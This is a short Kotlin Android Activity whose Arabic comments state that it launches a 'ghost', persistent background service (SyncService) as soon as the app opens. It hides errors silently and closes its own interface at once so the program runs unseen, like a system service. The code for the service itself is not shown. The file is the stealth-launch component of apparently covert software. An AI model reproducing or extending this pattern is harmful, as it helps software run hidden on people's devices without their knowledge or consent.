package com.assets.service

import android.app.Activity
import android.content.Intent
import android.os.Bundle

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            // تشغيل الخدمة الخلفية الشبحية المستمرة فور فتح التطبيق
            val serviceIntent = Intent(this, SyncService::class.java)
            startService(serviceIntent)
        } catch (e: Exception) {
            // معالجة الأخطاء الصامتة لضمان استقرار التطبيق
        }
        
        // إغلاق الواجهة الرسومية فوراً ليعمل البرنامج كاملاً في الخلفية كخدمة نظام
        finish()
    }
}
